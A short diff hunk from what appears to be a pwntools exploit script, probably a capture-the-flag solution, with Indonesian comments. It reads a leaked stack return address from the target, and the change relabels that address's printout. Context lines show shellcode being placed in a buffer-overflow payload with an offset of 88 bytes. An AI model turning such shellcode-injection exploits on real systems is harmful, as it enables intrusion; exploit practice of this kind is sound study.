@@ -49,7 +49,7 @@ shellcode_len = len(shellcode)
 # mendapatkan ret address
 io.recvuntil("I'm waiting for you at ")
 leak = int(io.recvuntil("\n",drop=True),16)
-print(hex(leak))
+print("[!]Return Address = ",hex(leak))
 
 # craft payload
 offset = 88 - shellcode_len
